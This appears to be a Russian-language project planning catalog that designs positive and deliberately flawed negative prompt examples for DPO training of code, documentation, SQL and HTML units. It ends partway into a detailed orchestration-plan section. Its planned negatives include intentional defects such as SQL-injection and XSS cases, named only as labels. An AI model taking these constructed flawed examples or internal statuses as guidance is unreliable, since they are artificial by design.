| Серверный код | PE-4 | ✅ ЗАПОЛНЕНО PE-4 **[FIX-PE-4]**: positive (bounded teacher-call plan-09 §Шаг 3a на живом `MarketplaceService.PublishListingAsync` + Y_goal в полной DNA-рамке `DataProcessResult<T>`/fabric-first/tenant/idempotency + student-проекция) + 5 доменно-локальных DNA-негативов (`dna_throw_for_business_logic`/`dna_null_or_bare_bool_return`/`dna_concrete_dependency_bypass`/`dna_missing_tenant_isolation`/`dna_non_idempotent_create` — КАЖДЫЙ с явным родителем `PromptError-02 No DNA Safety` + осью скорера RAG-07; RAG-07-рубрики = ось скорера, НЕ код негатива, single-owner FC-44) + DPO-pair-readiness (14 полей, fan-out 5 пар, доменный CODE-OVERLAP `>0.75→discard` после вычитания `frame` без нижней границы, `DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] — доменного Phase-0-блока НЕТ, false держат G-DPO-FINAL + отсутствие builder) + гейты честности (anti-reward-hack код-специфика: не форматирование-как-сигнал; secretPresence; share-alike-карантин ASVS) + источники реализма (ЖИВОЙ spot-read `src/Xiigen.*` обоих репо + RAG-07 лицензии VERIFIED) — секция «Prompt-Examples проход PE-4/10» |
| Клиентский код | PE-5 | ✅ ЗАПОЛНЕНО PE-5 **[FIX-PE-5]**: positive (bounded teacher-call plan-09 §Шаг 3a на живом `submitRegistration()` FLOW-01 + Y_goal в клиентской рамке [тонкий компонент → типизированный сервис `RegistrationApi` + `takeUntilDestroyed(DestroyRef)` + типизированный DTO + error-ветка + signal-мутации + идемпотентный submit] + student-проекция) + 5 негативов (3 доменно-локальных Angular-кода `ng_unmanaged_subscription_leak`/`ng_http_in_component_service_bypass`/`ng_untyped_any_boundary` — КАЖДЫЙ с явным родителем `PromptError-02 No DNA Safety` + 2 канонических RAG-07 `secretPresenceArbiter` [CWE-798]/`idempotentCreateArbiter` [клиентская половина] как ОСЬ СКОРЕРА, не код негатива — single-owner FC-44) + DPO-pair-readiness (14 полей, fan-out 5 пар, клиентский CODE-OVERLAP `>0.75→discard` после вычитания `frame` [двух-текстовый юнит `.ts`+`.html`], `DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] с честным split «форма-жива / API-wiring=SYNTHETIC_SEED», LegScope=`PersonalAdaptive` paid-домен Angular) + гейты честности (anti-reward-hack код-специфика: не форматирование-как-сигнал; mojibake-ось острая — иврит в template 47 клиентов; secretPresence синтетический placeholder) + источники реализма (ЖИВОЙ counted spot-read 47 Angular-клиентов xiigen-flows + RAG-02/RAG-07 лицензии VERIFIED живым grep) — секция «Prompt-Examples проход PE-5/10» |
| Серверная документация | PE-6 | ✅ ЗАПОЛНЕНО PE-6 **[FIX-PE-6]**: positive (bounded teacher-call plan-09 §Шаг 3a на живом `MarketplaceService.PublishListingAsync` [PE-4-якорь, кросс-задачная симметрия улучшить↔задокументировать] + `Y_goal` = 8-секционный wiki-док живого шаблона `DocumentationGeneratorUnit`, каждое утверждение с `file:line`/ev-привязкой; scorer grounding-rate ПЕРВИЧНАЯ ось; student-проекция `ProjectDocumentationUnit` 15 полей) + 5 негативов (**N1 доменно-локальный КРИТИЧЕСКИЙ `doc_hallucinated_claim` [false-presence — THE-дефект: `hallucination_rate=0.68`; отсутствует и в каноне, и в живой таксономии doc-генератора: counted 10 rejected-веток = все omission]** + 4 канонических `ORCH-02`/`PromptError-11`/`PromptError-09`/`PromptError-12`, ровно одна ошибка `[WRONG:]`) + DPO-pair-readiness (14 полей, fan-out 5 пар, EVIDENCE-GROUNDING гейт ПЕРВИЧНЫЙ + doc-overlap `>0.75→discard` вторичный, все 6 `ExcludedLeakageSignals`, `DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] с УНИКАЛЬНОЙ нотой: единственный домен с живым DPO-генератором И измеренным ПРОВАЛЬНЫМ baseline `0.286`/`0.68`, LegScope=`common`-кандидат Free=.NET [обратно к серверу PE-4] но privacy `.xiigen`) + гейты честности (`DocumentationGeneratorOutput.Confidence` self-report≠приёмка; acceptance-independence; length-hack ось острая omission-vs-addition) + источники реализма (ЖИВОЙ counted spot-read `42.ProjectWikiDomain` doc-pipeline + `RAG-02` `0.286`/`0.68` VERIFIED + THE-пробел локализован в сиблинг-юнитах) — секция «Prompt-Examples проход PE-6/10» |
| Клиентская документация | PE-7 | ✅ ЗАПОЛНЕНО PE-7 **[FIX-PE-7]**: тот же doc-конвейер `42.ProjectWikiDomain`, что PE-6, но документируемый СУБЪЕКТ = живой Angular-компонент FLOW-01 (якорь `App.submitRegistration()` `app.ts:98–:101`); positive (bounded teacher-call plan-09 §Шаг 3a + `Y_goal` = 8-секционный evidence-grounded wiki-док СТАТИЧЕСКОЙ реальности с absence-evidence «imports без HttpClient + survey 47 клиентов = 0 хитов»; ловушка — UI-строка `:100` «email queued» при 0 сетевых вызовов → док про HTTP = галлюцинация BY CONSTRUCTION; scorer = БИНАПРАВЛЕННЫЙ grounding; student-проекция doc-юнита) + 5 негативов (**N1 доменно-локальный `doc_hallucinated_claim` false-presence — переиспользован из PE-6 БЕЗ переименования, no dual-canon** + **N4 `doc_omitted_behavior_false_absence` НОВЫЙ явный код — ЗЕРКАЛО-контраст к N1** + **N5 `doc_wrong_framework_terminology` — ось «терминология фреймворка», сплит AngularJS↔Angular** + 2 канонических `ORCH-02`/`PromptError-11`; ровно ОДНА ошибка `[WRONG:]`) + DPO-pair-readiness (14 полей, fan-out 5 пар, БИНАПРАВЛЕННЫЙ EVIDENCE-GROUNDING гейт [unsupported-claim + uncovered-fact] ПЕРВИЧНО + doc-overlap `>0.75→discard` вторично, все 6 `ExcludedLeakageSignals`, обе проекции chosen/rejected, `DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] — **flip против образца-Fable `true`**, baseline `0.286`/`0.68` на Angular НЕ переносится [TS PENDING], LegScope=`PersonalAdaptive` [Paid=Angular, сплит «механика-vs-строки»]) + гейты честности (`Confidence` self-report слеп к false-presence; acceptance-independence scorer≠trained_unit_self_confidence; catalog≠capability; двусторонний length-hack острее PE-6) + источники реализма (ЖИВОЙ counted spot-read `xiigen-flows` Angular [47 dirs, 0 транспорт-хитов, `app.ts`/`app.html` полный re-read] + `42.ProjectWikiDomain` doc-pipeline live re-read + carrier-mismatch `CSharpLanguageVersion` `:1570` VERIFIED [кандидат PE-10] + `RAG-02` grep) — секция «Prompt-Examples проход PE-7/10» |
| Хранимые процедуры | PE-8 | ✅ ЗАПОЛНЕНО PE-8 **[FIX-PE-8]**: тип = КОД-задача (сгенерировать/улучшить процедуру); долг локации SQL §4 п.1 ОТРАБОТАН СОБСТВЕННЫМ counted spot-scan ЭТИМ пассом (**VERIFIED: 0 реальных `CREATE PROC(EDURE)` определений + 0 tracked `*.sql` во всех 5 доступных репо + 0 `*.sql` на ФС + 0 DbContext**; текстовые хиты — только живая абстенция `ABSTAIN_NO_SOURCE` `SmartWikiServiceTests.cs:140–:141` + синтетические тест-фикстуры `ProjectWikiDomainTests.cs:2532,:2613`; образцовый репо `xiigen mvp`/`outbox.schema.sql` на машине ОТСУТСТВУЕТ → CITED-not-verified); SOURCE_STATUS=`SYNTHETIC_SEED`-forward (поза платформы для БД-процедур=`ABSTAIN_NO_SOURCE`); positive (bounded teacher-call plan-09 §Шаг 3a на живом синтетическом SP-контракте `dbo.GetOrderTotals0` `BuildStoredProcedureUnits :293–:327` + `Y_goal` строго в контрактной рамке: identity/params byte-exact, явный result set, bounded side-effects, idempotent audit в TRY-CATCH + student-проекция) + 5 негативов (**пара N1 `sql_hallucinated_parameter` НОВЫЙ доменно-локальный false-presence ↔ N2 `missing_sql_side_effects` ЖИВОЙ канон-код :89–:90 переиспользован БЕЗ переименования false-absence** + N3 `sql_injection_unsafe_concat` доменно-локальный security [RAG-07 `sqlInjectionArbiter`=ось скорера] + N4 `ORCH-02 Missing Evidence` + N5 `PromptError-11 Vague`; каждый ровно ОДНА `[WRONG:]`, непересекающиеся дифф-регионы) + DPO-pair-readiness (14 полей, fan-out 5 пар, обе проекции chosen/rejected, grounding-гейт ПЕРВИЧНО + SQL-OVERLAP `>0.75→discard`, все 6 `ExcludedLeakageSignals`, **flip `DpoTrainReady` `true→false` против образца-Fable** [условно от M1 + SYNTHETIC_SEED source-кавета + G-DPO-FINAL], LegScope=`PersonalAdaptive` Paid=SQL + consent) + гейты честности (acceptance-independence scorer≠trained_unit_self_confidence; Confidence-ловушка `flags.Count/flags.Length` слепа к N1/N4; catalog≠capability учитель НЕ вызывался, SP НЕ исполнялась, 0 БД; SYNTHETIC_SEED помечен честно) + источники реализма (ЖИВОЙ полный re-read SP-промпт :66–:71 + SQL-таксономия :85–:94 + маршрутизация :194–:257 + синтетический корпус :293–:327 + живая абстенция :137–:141 + counted spot-scan VERIFIED) — секция «Prompt-Examples проход PE-8/10» |
| HTML-CSS | PE-9 | ✅ ЗАПОЛНЕНО PE-9 **[FIX-PE-9]**: тип = КОД-задача (улучшить HTML+CSS фрагмента макета), домен `44.DesignConversionDomain` + FigmaToCode `Element/Style` IR (baseline); **counted spot-read живых типов VERIFIED** (`IDesignConversionImproverUnit : ILogicalUnit<...>` `DesignConversionUnitContracts.cs:41–:44`; `VisualVerdict`/`ImprovementCandidate{Html,Css}` `DesignConversionContracts.cs:95–:139`; FigmaToCode `Element`/`Style` IR `models/Element.ts:4–:23`/`Style.ts:3–:10`; лицензия ISC `package.json:5`; XSS-вектор raw `containingString` `element-code.ts:130–:151`); positive (bounded teacher-call plan-09 §Шаг 3a + `Y_goal` в полной контрактной рамке дизайна [семантика/доступность/адаптив auto-layout→flex/полнота IR/escape] + student-проекция) + 5 негативов (**3 доменно-локальных `dcm_*`: N1 `dcm_xss_unsanitized_markup` security text-only-карантин [канонического RAG-07 XSS-арбитра НЕТ]; пара false-presence↔false-absence N2 `dcm_uncovered_ir_node` false-absence [узел IR потерян, родитель = живой `missing_element`] ↔ N3 `dcm_hallucinated_element` false-presence [элемент не из IR]** + 2 канонических `ORCH-02 Missing Evidence`/`PromptError-11 Vague`; каждый ровно ОДНА `[WRONG:]`, непересекающиеся дифф-регионы, no dual-canon FC-44) + DPO-pair-readiness (14 полей, fan-out 5 пар, обе проекции chosen/rejected, **REWARD-SCALARIZATION ОБЯЗАТЕЛЬНА SI_GATE_3: `reward(side)=Beta·(policyLogP(Norm(Serialize(html+css))|ctx)−referenceLogP)` для DPO-margin + `Q_struct=w_sem·structural_fidelity+w_sty·style_fidelity+w_a11y·a11y+w_sec·security−w_norm·markup_normalization_penalty` eval-only Y_best-selection; `VisualVerdict.Score` ИСКЛЮЧЕНА из обоих до Phase-0**, markup-нормализация `Norm()` ПЕРЕД overlap И reward, MARKUP-OVERLAP `>0.75→discard` после вычитания frame + LOW_CONTRAST overlap≥0.60/margin≤0.05, все 6 `ExcludedLeakageSignals`, **`DpoTrainReady=false` держит §4 п.3 эхо-судья — ЕДИНСТВЕННЫЙ код-домен с настоящим Phase-0-блоком в арбитре приёмки**, LegScope=`common`-кандидат [HTML+CSS вне платного RAG-02, FigmaToCode ISC + первопартийный 44] с user-макет→PersonalAdaptive каветой) + гейты честности (acceptance-independence scorer≠trained_unit_self_confidence И ≠echo_judge_constant SI_GATE_7 [VERIFIED `critic.Confidence==verdict.Score` `DesignConversionTrainedUnits.cs:47/:250`]; catalog≠capability учитель НЕ вызывался/рендер НЕ запускался/юнит НЕ обучен/эхо-судья/Route B пуст/0-10 e2e; markup-reward-hack предотвращён нормализацией) + источники реализма (VERIFIED counted spot-read 44-домен + FigmaToCode IR/лицензия/XSS-вектор) — секция «Prompt-Examples проход PE-9/10» |
| Консолидация + DPO-pair-readiness + привязка WO-M1.1/домены + parity re-stamp | PE-10 | ✅ ЗАПОЛНЕНО PE-10 **[FIX-PE-10]**: секция «КОНСОЛИДАЦИЯ PE-10/10 — сквозные гейты G1–G6» добавлена в конец файла (cross-catalog sweep, НЕ новая задача). **G1** DpoTrainReady-матрица 8 задач = **ВСЕ 8 false** (no dual-live-canon статуса готовности FC-44; задача 8 держится §4 п.3 эхо-судьёй + G-DPO-FINAL, остальные 7 = G-DPO-FINAL [условно ±M1/токенайзер/SYNTHETIC_SEED]). **G2** name-reconciliation свод негативов (канонические `ORCH-01/02/03/08/09`, `PromptError-09/11/12`, `RAG-03`-коды; `RAG-07`-рубрики = ОСЬ СКОРЕРА, не код негатива; доменно-локальные `dna_*`×5/`ng_*`×3/`doc_*`×3/`sql_*`×2/`dcm_*`×3; переиспользованы БЕЗ переименования `missing_sql_side_effects`[живой канон]/`doc_hallucinated_claim`[PE-6→PE-7]); **FC-44 no-dual-canon = PASS**, родительские оси названы; расхождение с образцом-Fable (он — живые коды 44 `semantic_layout_hierarchy`/`responsive`/`missing_element`; мы — `dcm_*`) — ОБА FC-44-чисты. **G3** carrier-mismatch реестр (главный: `CSharpLanguageVersion` `:1570` несёт TS-версию в 15-полевом `ProjectDocumentationUnit` `:1561–:1576`, PE-7 VERIFIED) = наблюдения для code-repair backlog, НЕ починка (PLAN-ONLY). **G4** LegScope-резидуалы: `LUBA_PRODUCT_DECISION_RESIDUAL` = задача 6 (клиент-документация Angular), 7 (SQL), 8 (HTML-CSS common↔PersonalAdaptive) **[pass-time PE-10; SUPERSEDED FIX-RES-1 2026-07-14: задачи 6/7/8 → `RESOLVED_FROM_DOCUMENTED_AUTHORITY`, остаётся только non-blocking opt-in `paid-domain common leg` для 6/7 — см. G4 + `pass_residual_resolution`]**; common-кандидаты 3/5; PersonalAdaptive задача 4; задачи 1/2 LegScope не заявлен явно (common-кандидат по умолчанию, наблюдение). **G5** SI_GATE-покрытие: `SI_GATE_4` fan-out + `SI_GATE_7` acceptance-independence = ВСЕ 8; `SI_GATE_3` reward-scalarization generic (§1.3 п.5) для всех структурных + явный `Q_struct` только задача 8; `SI_GATE_1/2/6` single-owner/owner-pointer/Y_best; `SI_GATE_5` order-carrier = задача 1, N/A-с-причиной для не-последовательностных; `SI_GATE_8/9/10` = владельцы plan-07/08, каталог НЕ перелочивает пороги (корректно); **дыр нет**. **G6** привязка `WO-M1.1` (ЧЕСТНО: литерал = внутренний forward-pointer каталога, grep по папке = 0 hits вне каталога → CITED-not-verified; реальный хребет = Ф3 `GraphDpoBuilder`/`TrainableGraphDpoBuilderUnit`, владелец plan-07 §3.3/§3.5, доска Ф3.1.1, VERIFIED; каталог = входной seed-корпус `GraphDpoSourceRow`-материала) + roll-up §4 долгов (ОТРАБОТАНО п.1 SQL-корпус/п.3 эхо-судья; ОСТАЮТСЯ п.2/п.4/п.5/п.6 + эхо-судья-замена=code-repair + SP-генерация) + **catalog≠capability** (0 учителей вызвано, 0 пар построено, 0 юнитов обучено) — секция «КОНСОЛИДАЦИЯ PE-10/10» |

Правило stale-status-carrier (FC-44): при заполнении задачи проходом PE-N её строка здесь и
front-matter `pass` обновляются в ОДНОМ шаге; двух живых противоречивых статусов быть не должно.

**[FIX-RES-1] Проход разрешения резидуалов (2026-07-14, Opus 4.8).** Не новая задача-тип и не новый пример —
это sweep-проход, вписывающий 7 УЖЕ ПРОВЕРЕННЫХ резолюций (Fable предложил, Opus-родитель валидировал
VERIFIED-опоры, Luba одобрила применение), анализ НЕ переоткрывается. Что вписано и где (все носители статуса
обновлены в ОДНОМ шаге, no dual-live-canon): **A1/A2/A3** — G4 строки 6/7/8 `LUBA_PRODUCT_DECISION_RESIDUAL` →
`RESOLVED_FROM_DOCUMENTED_AUTHORITY` (прежний статус помечен historical/pre-resolution рядом); **B1** — §4 п.6 + G6(б)
+ 07-файл `Q-TP-235B-EVAL`: hosted acceptance number = `RESOLVED_BY_LUBA_LIVE` 2026-07-14 (`HeldOutAccuracy >= 0.90`) +
нота-риск; **B2/B3/B4** — §4 п.3/п.1/п.4 + G1 unlock строк 6/8 + G6(б): формализация долгов (эхо-судья-замена,
SP-capability, TS-baseline). NARROWED-остаток `paid-domain common leg` (non-blocking, opt-in Luba) сохранён для A1/A2.
`DpoTrainReady` 8×false / счётчики (`WO 53`/`решения 26`/`ветки 55`/`связи 21`/`M5=46`) / `PLAN_NOT_READY` НЕ тронуты
(`catalog != capability`).

### §5.3 Счётчики и readiness (проход PE-1)

- **WO: 53 — БЕЗ изменений** (каталог = plan-content/схема, не work-order; возможный WO — только в
  PE-10 с явным движением счётчика). **Решения: 26 — БЕЗ изменений** (директива Luba о каталоге =
  живое задание, не новый открытый вопрос). **Ветки 55 / связи 21 / §0-узлы — БЕЗ изменений**
  (примеры промптов не добавляют классов/веток Part A). **Знаменатель M5 = 46 — БЕЗ изменений.**
- Статусы плана НЕ тронуты: PLAN-ONLY; `PLAN_NOT_READY` плана НЕ меняется; PE-цепочка — авторская
  дельта, которой перед исполнением положена своя валидация (пер-проходные вердикты Opus 4.8).

### §5.4 Handoff в PE-2 (Оркестрация)

- **Задача PE-2:** заполнить шаблон §2.1 для задачи 1 «Оркестрация».
- **Домен-адресация:** `OrchestrationPlanMachine` (42) + конвейер стадий 43 + L5-граф
  `ILearningDynamicGraph`; `Level=node|edge`; `NodeOrEdgeId` по паттерну `graph/edge/<стадия>`.
- **Positive:** bounded teacher-call (plan-09 §Шаг 3a) с `requirements` = структурная валидность
  плана (bounded phases + gates, покрытие сигналов, candidate-set validity); goal_text = структура
  плана оркестрации, не эссе; достижимо студентом ≤3–4B.
- **Negative:** РОВНО одна ошибка, `[WRONG: ORCH-код + каноническое имя — описание — последствие]`
  (кандидаты: `ORCH-03 Deterministic Shortcut` (критический), `ORCH-08 Product Decision Masquerade`
  (критический), `ORCH-01 Wrong Stage Order`, `ORCH-09 Insufficient Verification`); правдоподобный,
  проходит G1–G6 (G4 overlap 0.45–0.75).
- **Pair-readiness:** 14 полей §1.4, fan-out winner-vs-each-loser (N−1 пар), reward-scalarization
  logprob-margin (plan-07 :341–:360), `TeacherProvenance` = указатель на 20-полевой канон plan-08 §3.1.
- **Источники реализма:** `RAG-02` (wiki/plugin-контур), `RAG-10` §6, §P4-B этого плана (read-only,
  с `file:line`).
- **Гейты честности:** wrong-marker срез до обучения; acceptance-independence (`IndependentDomainScorer`
  решает); margin > 0.05; anti-reward-hacking §1.3 п.7; `DpoTrainReady` — условный до `G-DPO-FINAL`.
- **Метод:** одиночный bounded-агент, PLAN-ONLY, только этот файл; после — валидация Opus 4.8.

---

## Prompt-Examples проход PE-2/10 — Задача 1 — Оркестрация

**[FIX-PE-2]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный
bounded architect-author прохода PE-2/10 (PLAN-ONLY, R2: ни продуктового кода, ни
тестов, ни ollama, ни git-write; правился ТОЛЬКО этот файл; наш план 07/08/09/overlay,
RAG-02/10 и живой код 42/43 читались read-only). **Авторитет:** живая unquoted-директива
Luba 2026-07-13 (каталог примеров промптов positive/negative под 8 задач, «в соответствии
с реализацией», переносом из плана-источника с переякориванием на наш канон) + вердикт
Opus 4.8 на PE-1 — VALID. Содержание = заполненный шаблон §2.1 для задачи 1 «Оркестрация»,
все коды негативов — канонические имена `ORCH-01..10` (владелец имён — датасет `RAG-10`
§6.2; binding-правило §2.3). Перенос из секции-источника «Prompt-Examples проход 2/10»
(`PLAN-VS-VSCODE-CONTINUE-v1.md` :4134–:4295): ярлыки источника `2PH-2.x/2PH-3.x/§P4-B`
переякорены на наши блоки 07/08/09 + overlay (карта переякоривания «Карта переякоривания»
выше). Второй канон НЕ создаётся.

### Задача 1 — Оркестрация (OrchestrationPlanMachine-42 + конвейер 43 + L5-граф)

#### PE-2.1 Блок 1 — ДОМЕН РЕАЛИЗАЦИИ + адресация пары

По-человечески: «оркестрация» здесь — **стадия 2** конвейера расширений: из типизированных
СИГНАЛОВ задачи (НЕ из сырого промпта — анти-replay) построить многостадийный
оркестрационный план `OrchestrationScenarioPlan`. Владелец обучаемого актива (стадия 2) —
`OrchestrationPlanMachine` (домен `42.ProjectWikiDomain`), это РЕАЛЬНЫЙ L5-класс
`ILearningMachine<OrchestrationPlanDomain>` (counted-факт: `42.ProjectWikiDomain\OrchestrationPlanMachine.cs:7`;
`MachineId="orchestration-plan-machine"`, встроенный `EvaluationAccuracyGateThreshold=0.75`
на :12). Конвейер стадий — РЕАЛЬНЫЙ проект `43.SmartSkillsDomain` (counted-факт: живые
`43.SmartSkillsDomain\PromptToTaskMachine.cs` (стадия 1: сырой промпт → `StructuredTaskContract`)
и `43.SmartSkillsDomain\SkillSelectionMachine.cs` (стадия skill-выбора)). **Честный долг
грунта:** L5-граф `ILearningDynamicGraph` / `LearningDynamicGraphMachine.TrainBatchAsync` с
маршрутизацией по `NodeOrEdgeId` — плановая концепция, в коде llm_mvp_core её НЕТ (counted:
0 grep-хитов на `interface ILearningDynamicGraph` и `class LearningDynamicGraphMachine`);
поэтому вся адресация ниже — **[условно от M1/M2]**: маршрута обучения в коде НЕТ.

Адресация пар (канон блока 07 — `GraphDpoPair.Level` / `NodeOrEdgeId`, §1.4):
- **plan-пары этого прохода (уровень узла):** `Level="node"`,
  `NodeOrEdgeId="graph/node/orchestration-plan-stage2"` — `chosen`/`rejected` = целые
  оркестрационные планы стадии 2 (форма пары: `{chosen: принятый OrchestrationScenarioPlan,
  rejected: near-miss план с [WRONG: ORCH-XX]}`). Обучаемый владелец узла в коде =
  `OrchestrationPlanMachine` (42).
- **dispatch-пары (уровень ребра):** `Level="edge"`, `NodeOrEdgeId="graph/edge/stage1-dispatch"`
  — канон ребра-диспатча (сырой промпт → выбор узла-стадии) живёт у владельца ребра
  (`active-codex-execution-plan-02-edge.md`); каталог ССЫЛАЕТСЯ на него, второй канон
  ребра НЕ создаётся (single-owner FC-44).
- **LegScope:** `common` для примеров с внутренним корпусом (RAG-02, без приватных
  пользовательских токенов); plan-пары с приватными именами классов реального проекта
  пользователя → `PersonalAdaptive` (`.xiigen`) до redaction+approval.
- Маршрут строки (плановый): DPO-build → `LearningDynamicGraphMachine.TrainBatchAsync`
  маршрутизирует по `NodeOrEdgeId` к состоянию узла/ребра; незарегистрированный адрес →
  честный `NODE_TRAINER_NOT_REGISTERED` + карантин-очередь. Всё **[условно от M1/M2]**.

#### PE-2.2 Блок 2 — POSITIVE (chosen) пример промпта

Сценарий (реальный якорь корпуса — `RAG-02-orchestrator-extension.md:44`): entity-impact
задача «добавить `DiscountCode` в `CampaignCreateDto`» — от стадии 2 нужен многостадийный
ПЛАН исследования влияния, НЕ сам ответ. (Тот же якорь валидирован в RAG-02 как
`entity_impact_trace 1.0`, :257.)

**(а) Bounded teacher-call (наш plan-09 §Шаг 3a :492–:502) — заполненный request-JSON
(учитель Qwen3.5-9B, профиль `qwen35-local-v1` plan-08 §3.5.2, видит ТОЛЬКО эти поля, НЕ
репозиторий):**

```json
{
  "task": "Улучшить оркестрационный план для этой задачи: построить многостадийный план исследования влияния добавления поля в DTO (класс задачи entity_impact). Улучшай ПЛАН (порядок стадий, evidence-требования, гейты), не решай саму задачу.",
  "target_unit": "graph/node/orchestration-plan-stage2",
  "input_context": "TaskSignalEnvelope{ Signals: [\"entity_impact_task\", \"deliverable:impact_report\", \"evidence_required:code_trace\", \"constraint:no_product_decisions\"], IntentFrame: { Kind: \"AnalysisRequest\", RequiresApprovalGate: false }, RawPromptSha256: \"c41d...\" } — типизированные сигналы стадии 1; сырого промпта НЕТ (анти-replay)",
  "current_best_output": "OrchestrationScenarioPlan{ PhaseFamilies: [\"evidence-collection\", \"entity-impact-analysis\", \"report-composition\"], GateFamilies: [\"evidence-threshold\"], StageBoard: [ {Phase: \"evidence-collection\", Executor: \"code-trace-узел\", RequiredEvidence: [\"dto-usage-trace\"]}, {Phase: \"entity-impact-analysis\", DependsOn: \"evidence-collection\"}, {Phase: \"report-composition\", DependsOn: \"entity-impact-analysis\"} ] } — Y_best: лучший кандидат УЧЕНИКА (async-комбинации P-06, plan-09 §3 Шаг 2); verification-фазы нет, Gate B не на каждой фазе",
  "requirements": [
    "порядок стадий соблюдает конвейер: сбор evidence -> анализ -> композиция -> верификация; ни одна фаза не стартует раньше своих входов (stage-order)",
    "каждая фаза с выводами имеет evidence-вход; утверждения о состоянии проекта без проверенного evidence запрещены (evidence-grounding)",
    "исполнитель каждой фазы — типизированное поле; словарь/lookup/шаблон как финальная власть фазы запрещён (no-deterministic-shortcut)",
    "у каждой фазы есть Gate B; финальная verification-фаза обязательна (verification present)",
    "план не принимает продуктовых решений: спорные выборы уходят в approval-gate (no-product-decisions)",
    "план покрывает все сигналы задачи и не добавляет фаз без порождающего сигнала (coverage, без scope creep)"
  ],
  "wrong_markers": [
    "ORCH-01 Wrong Stage Order", "ORCH-02 Missing Evidence", "ORCH-03 Deterministic Shortcut",
    "ORCH-08 Product Decision Masquerade", "ORCH-09 Insufficient Verification"
  ],
  "output_schema": {
    "goal_text": "string — улучшенный OrchestrationScenarioPlan (Y_goal); структура, не эссе",
    "improvements": "string[] — существенные улучшения относительно current_best_output",
    "current_output_is_already_optimal": "bool — self-report учителя (диагностика, НЕ приёмка)"
  }
}
```

Бюджет (plan-09 :499): `max_input_tokens = num_ctx − reserved_output_tokens`, `num_ctx≈8192`.
Аппроксимация автора: task+criteria ≈ 650 ток.; input_context ≈ 350; current_best_output ≈
600; format ≈ 350; резерв ответа 1024 — итого ≈ 3000 ≪ 8192: пример unit-level, влезает без
порезки (`trimmed=false`; фактический токен-счёт меряет токенайзер при build, каталог его НЕ
заявляет). Разделение властей (plan-09 :501): LLM производит ТОЛЬКО `goal_text`+`improvements`
(+диагностический self-report); provenance/приёмку/легальный вердикт собирает
детерминированный C#-адаптер `TeacherProvenanceAdapter`, НЕ LLM.

**(б) Ожидаемая форма ХОРОШЕГО выхода (`goal_text` = Y_goal; структура, достижимая
студентом ≤3–4B):**

```json
{
  "goal_text": "OrchestrationScenarioPlan{ PhaseFamilies: [\"evidence-collection\", \"entity-impact-analysis\", \"report-composition\", \"verification\"], GateFamilies: [\"evidence-threshold\", \"coverage-gate\", \"verification-gate\"], StageBoard: [ {Phase: \"evidence-collection\", Executor: \"code-trace-узел (обучаемый)\", RequiredEvidence: [\"dto-usage-trace\", \"persistence-touchpoints\", \"caller-map\"], GateB: \"каждый touchpoint несёт code-ref\"}, {Phase: \"entity-impact-analysis\", Executor: \"impact-узел (обучаемый)\", DependsOn: \"evidence-collection\", GateB: \"каждая impact-строка ссылается на собранный evidence-id\"}, {Phase: \"report-composition\", DependsOn: \"entity-impact-analysis\", GateB: \"каждое утверждение отчёта несёт evidence-ref; спорная структура deliverable -> approval-gate\"}, {Phase: \"verification\", DependsOn: \"report-composition\", GateB: \"полнота touchpoints против caller-map; незакрытые расхождения -> честный not_ready\"} ] }",
  "improvements": [
    "добавлена финальная verification-фаза с Gate B (в Y_best не было ни одной проверки завершения)",
    "Gate B назначен КАЖДОЙ фазе, а не только общему evidence-порогу",
    "спорный выбор структуры deliverable выведен в approval-gate (исполняет сигнал constraint:no_product_decisions)"
  ],
  "current_output_is_already_optimal": false
}
```

**(в) Пер-доменные проверки `IndependentDomainScorer` (ось оркестрации — карта §3 строка 1;
детерминированный eval-only судья, overlay :257; пороги/веса — per-WO деталь, WO может только
УЖЕСТОЧИТЬ):**
1. structured-JSON/схема валидны (`PhaseFamilies`/`GateFamilies`/`StageBoard` — форма
   `OrchestrationScenarioPlan`);
2. **stage-order correctness:** `DependsOn`-граф ацикличен; ни одна фаза не стартует раньше
   своих входов (провал = класс `ORCH-01`);
3. **evidence-grounding:** каждая analysis/composition-фаза имеет транзитивный вход от
   evidence-фазы (мотив оси: базовая модель документации RAG-02 провалила held-out —
   провал приведён в RAG-02 §held-out, per источник-образец PE-2, этим пассом НЕ перечитан;
   провал = класс `ORCH-02`);
4. **no-deterministic-shortcut:** `Executor` — типизированное поле; `lookup`/`dictionary_replay`/
   `template` как финальная власть фазы → провал (класс `ORCH-03`);
5. **verification present:** финальная verification-фаза существует; каждая фаза несёт непустой
   `GateB` (класс `ORCH-09`);
6. **coverage/scope:** каждый сигнал envelope покрыт хотя бы одной фазой; нет фаз без
   порождающего сигнала (класс `ORCH-04 Scope Creep`);
7. **candidate-set validity:** узлы-исполнители ∈ допустимых кандидатов топологии;
   позиционные/провенансные признаки в скоринге запрещены (candidate-order leakage guard).
Решение гейта (наш `ChosenSelectionRule`, overlay :242–:254 / plan-09 :497):
`Y_goal := argmax_k Score(g_k)` (best-of-K ЦЕЛИ учителя, `k_generations=4` PROPOSED_DEFAULT,
plan-09 :496); `chosen = Y_goal ⇔ Score(Y_goal) > Score(Y_best)`, ничья/НЕТ → `chosen = Y_best`
(лучший кандидат УЧЕНИКА). Непобедившие генерации учителя `g_k` (k≠argmax) — eval-only, НЕ
становятся `rejected` и НЕ входят в fan-out (plan-07).

**(г) STUDENT-проекция (типизированный I/O обучаемой стороны):** вход/выход узла стадии 2 =
`TaskSignalEnvelope{Signals, RawPromptSha256, IntentFrame}` → `OrchestrationScenarioPlan{
PhaseFamilies, GateFamilies, StageBoard}`. В паре: `InputContext` = сигналы envelope (НЕ сырой
промпт — анти-replay), `Chosen` = принятый план, `Rejected` = near-miss план. До обучения
сигнальной ноги студент честно отдаёт not_ready с `RiskFlags:["SIGNAL_GROUNDING_UNTRAINED"]` —
путь `PASS_AS_HONEST_UNTRAINED_SCAFFOLD` (untrained honesty). Поля `StageBoard`/`Executor`/
`GateB` — плановые проекции формы `OrchestrationScenarioPlan`; детальных полей в коде пока НЕТ
(**[условно от M1/M2]**).

#### PE-2.3 Блок 3 — NEGATIVE (rejected) примеры: ТА ЖЕ задача, РОВНО ОДНА внедрённая ошибка

Каждый негатив — Error-Injection над положительным планом (б): полный правдоподобный план (НЕ
отказ, НЕ мусор — G1) с ОДНОЙ главной ошибкой, КАНОНИЧЕСКИМ кодом (`ORCH-01..10`, §2.3) и
